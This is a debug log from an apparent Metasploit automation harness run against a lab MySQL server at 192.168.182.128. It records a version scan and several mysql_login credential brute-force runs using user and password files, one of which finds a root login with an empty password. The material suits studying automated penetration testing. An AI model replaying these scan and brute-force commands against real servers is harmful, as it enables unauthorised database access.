+2017-02-06 16:46:18,327 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:46:18,327 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:46:20,437 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Exited from msfconsole !!!
+2017-02-06 16:46:20,437 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:46:20,438 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Closing the child pipe !!!
+2017-02-06 16:46:20,538 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_1  Message --> :Saving details :
+2017-02-06 16:46:20,539 - Commands Logger - DEBUG - Command id is ->mysql_1
+2017-02-06 16:46:20,540 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/mysql/mysql_version\n', 'use auxiliary/scanner/mysql/mysql_version\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_version\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_version\x1b[0m) \x1b[0m> \n', u'set rport 3306\n', 'set rport 3306\r\r\n\x1b[0mrport => 3306\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_version\x1b[0m) \x1b[0m> \n', u'set threads 1\n', 'set threads 1\r\r\n\x1b[0mthreads => 1\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_version\x1b[0m) \x1b[0m> \n', '>run', 'run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_version\x1b[0m) \x1b[0m> \n']
+2017-02-06 16:46:20,540 - Commands Logger - DEBUG - My var : '$.Entries."mysql_1"'
+2017-02-06 16:46:20,540 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 is running MySQL 5.0.51a-3ubuntu5 (protocol 10)
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_version[0m) [0m> 
+2017-02-06 16:46:20,638 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:46:20,667 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Inside command_meta
+2017-02-06 16:46:32,418 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:46:32,418 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :0
+2017-02-06 16:46:35,526 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:46:38,631 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:46:41,735 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :use auxiliary/scanner/mysql/mysql_login
+[0m[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:44,847 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:47,955 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :set rport 3306
+[0mrport => 3306
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:51,061 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :set USERNAME root
+[0mUSERNAME => root
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:54,167 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :set threads 1
+[0mthreads => 1
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:54,167 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:46:59,278 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:46:59,279 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:46:59,279 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:46:59,279 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:47:01,384 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Exited from msfconsole !!!
+2017-02-06 16:47:01,384 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:47:01,385 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Closing the child pipe !!!
+2017-02-06 16:47:01,485 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_2  Message --> :Saving details :
+2017-02-06 16:47:01,487 - Commands Logger - DEBUG - Command id is ->mysql_2
+2017-02-06 16:47:01,487 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/mysql/mysql_login\n', 'use auxiliary/scanner/mysql/mysql_login\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set rport 3306\n', 'set rport 3306\r\r\n\x1b[0mrport => 3306\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set USERNAME root\n', 'set USERNAME root\r\r\n\x1b[0mUSERNAME => root\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set threads 1\n', 'set threads 1\r\r\n\x1b[0mthreads => 1\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', '>run', 'run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n']
+2017-02-06 16:47:01,487 - Commands Logger - DEBUG - My var : '$.Entries."mysql_2"'
+2017-02-06 16:47:01,488 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:01,590 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:47:01,619 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Inside command_meta
+2017-02-06 16:47:19,683 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:47:19,684 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :0
+2017-02-06 16:47:22,787 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:47:25,893 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:47:28,997 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :use auxiliary/scanner/mysql/mysql_login
+[0m[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:32,105 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:35,213 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :set rport 3306
+[0mrport => 3306
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:38,318 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :set USERNAME root
+[0mUSERNAME => root
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:41,424 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :set PASSWORD root
+[0mPASSWORD => root
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:44,533 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :set threads 1
+[0mthreads => 1
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:44,534 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:47:49,644 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:47:49,644 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: root:root (Incorrect: Access denied for user 'root'@'192.168.182.1' (using password: YES))
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:49,645 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:47:49,645 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:47:51,752 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Exited from msfconsole !!!
+2017-02-06 16:47:51,752 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:47:51,753 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Closing the child pipe !!!
+2017-02-06 16:47:51,853 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_3  Message --> :Saving details :
+2017-02-06 16:47:51,856 - Commands Logger - DEBUG - Command id is ->mysql_3
+2017-02-06 16:47:51,857 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/mysql/mysql_login\n', 'use auxiliary/scanner/mysql/mysql_login\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set rport 3306\n', 'set rport 3306\r\r\n\x1b[0mrport => 3306\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set USERNAME root\n', 'set USERNAME root\r\r\n\x1b[0mUSERNAME => root\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set PASSWORD root\n', 'set PASSWORD root\r\r\n\x1b[0mPASSWORD => root\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set threads 1\n', 'set threads 1\r\r\n\x1b[0mthreads => 1\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', '>run', "run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a\r\n\x1b[1m\x1b[31m[-]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: root:root (Incorrect: Access denied for user 'root'@'192.168.182.1' (using password: YES))\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n"]
+2017-02-06 16:47:51,857 - Commands Logger - DEBUG - My var : '$.Entries."mysql_3"'
+2017-02-06 16:47:51,857 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: root:root (Incorrect: Access denied for user 'root'@'192.168.182.1' (using password: YES))
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:47:51,937 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:47:51,973 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Inside command_meta
+2017-02-06 16:48:09,316 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:48:09,317 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :0
+2017-02-06 16:48:12,423 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:48:15,529 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:48:18,637 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :use auxiliary/scanner/mysql/mysql_login
+[0m[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:21,740 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:24,845 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :set rport 3306
+[0mrport => 3306
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:27,952 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :set  USER_FILE Scripts/users.txt
+[0mUSER_FILE => Scripts/users.txt
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:31,056 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :set threads 10
+[0mthreads => 10
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:31,056 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:48:36,164 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:48:36,164 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:36,164 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:48:36,164 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:48:38,269 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Exited from msfconsole !!!
+2017-02-06 16:48:38,270 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:48:38,270 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Closing the child pipe !!!
+2017-02-06 16:48:38,371 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_4  Message --> :Saving details :
+2017-02-06 16:48:38,373 - Commands Logger - DEBUG - Command id is ->mysql_4
+2017-02-06 16:48:38,373 - Commands Logger - DEBUG - commands are : ['>msfconsole', '\x1b[4mmsf\x1b[0m \x1b[0m> ', u'workspace -a Metasploit_automation\n', 'workspace -a Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Added workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'workspace Metasploit_automation\n', 'workspace Metasploit_automation\r\r\n\x1b[0m\x1b[1m\x1b[34m[*]\x1b[0m Workspace: Metasploit_automation\r\n\x1b[4mmsf\x1b[0m \x1b[0m> \n', u'use auxiliary/scanner/mysql/mysql_login\n', 'use auxiliary/scanner/mysql/mysql_login\r\r\n\x1b[0m\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set RHOSTS 192.168.182.128\n', 'set RHOSTS 192.168.182.128\r\r\n\x1b[0mRHOSTS => 192.168.182.128\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set rport 3306\n', 'set rport 3306\r\r\n\x1b[0mrport => 3306\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set  USER_FILE Scripts/users.txt\n', 'set  USER_FILE Scripts/users.txt\r\r\n\x1b[0mUSER_FILE => Scripts/users.txt\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', u'set threads 10\n', 'set threads 10\r\r\n\x1b[0mthreads => 10\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n', '>run', 'run\r\r\n\x1b[0m\r\n\x1b[1m\x1b[34m[*]\x1b[0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a\r\n\x1b[1m\x1b[34m[*]\x1b[0m Scanned 1 of 1 hosts (100% complete)\r\n\x1b[1m\x1b[34m[*]\x1b[0m Auxiliary module execution completed\r\n\x1b[4mmsf\x1b[0m auxiliary(\x1b[1m\x1b[31mmysql_login\x1b[0m) \x1b[0m> \n']
+2017-02-06 16:48:38,373 - Commands Logger - DEBUG - My var : '$.Entries."mysql_4"'
+2017-02-06 16:48:38,373 - Commands Logger - DEBUG - Result --> : 
+Command Executed :>msfconsole
+Result :
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:48:38,483 - Commands Logger - DEBUG - Finished!!!
+2017-02-06 16:48:38,512 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Inside command_meta
+2017-02-06 16:48:57,069 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :[4mmsf[0m [0m> 
+2017-02-06 16:48:57,070 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :0
+2017-02-06 16:49:00,174 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :workspace -a Metasploit_automation
+[0m[1m[34m[*][0m Added workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:49:03,279 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :workspace Metasploit_automation
+[0m[1m[34m[*][0m Workspace: Metasploit_automation
+[4mmsf[0m [0m> 
+2017-02-06 16:49:06,386 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :use auxiliary/scanner/mysql/mysql_login
+[0m[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:09,492 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :set RHOSTS 192.168.182.128
+[0mRHOSTS => 192.168.182.128
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:12,599 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :set rport 3306
+[0mrport => 3306
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:15,709 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :set  USERPASS_FILE Scripts/password.txt
+[0mUSERPASS_FILE => Scripts/password.txt
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:18,812 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :set  USER_FILE Scripts/users.txt
+[0mUSER_FILE => Scripts/users.txt
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:21,926 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :set threads 10
+[0mthreads => 10
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:21,926 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :
+
+Everything Fine till now-->Launching run command
+
+
+2017-02-06 16:49:27,052 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :
+
+Module Execution completed
+
+
+2017-02-06 16:49:27,053 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Before : 
+After : 
+run
+[0m
+[1m[34m[*][0m 192.168.182.128:3306  - 192.168.182.128:3306 - Found remote MySQL version 5.0.51a
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jame: (Incorrect: Access denied for user 'jame'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: jill: (Incorrect: Access denied for user 'jill'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: khan: (Incorrect: Access denied for user 'khan'@'192.168.182.1' (using password: NO))
+[1m[32m[+][0m 192.168.182.128:3306  - MYSQL - Success: 'root:'
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: toor: (Incorrect: Access denied for user 'toor'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin: (Incorrect: Access denied for user 'admin'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msfadmin: (Incorrect: Access denied for user 'msfadmin'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: msf: (Incorrect: Access denied for user 'msf'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: admin@123: (Incorrect: Access denied for user 'admin@123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: abc: (Incorrect: Access denied for user 'abc'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal123: (Incorrect: Access denied for user 'pal123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: pal@123: (Incorrect: Access denied for user 'pal@123'@'192.168.182.1' (using password: NO))
+[1m[31m[-][0m 192.168.182.128:3306  - 192.168.182.128:3306 - LOGIN FAILED: : (Incorrect: Access denied for user ''@'192.168.182.1' (using password: NO))
+[1m[34m[*][0m Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31mmysql_login[0m) [0m> 
+2017-02-06 16:49:27,053 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :
+
+Now exiting !!!
+
+
+2017-02-06 16:49:27,054 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :
+Exiting  from msfconsole !!!
+
+2017-02-06 16:49:29,165 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Exited from msfconsole !!!
+2017-02-06 16:49:29,165 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Before : 
+exit
+[0mAfter : 
+<class 'pexpect.exceptions.EOF'>
+2017-02-06 16:49:29,165 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Closing the child pipe !!!
+2017-02-06 16:49:29,267 - Commands Logger - DEBUG - Command Logger --->Command id --> mysql_5  Message --> :Saving details :
+2017-02-06 16:49:29,269 - Commands Logger - DEBUG - Command id is ->mysql_5
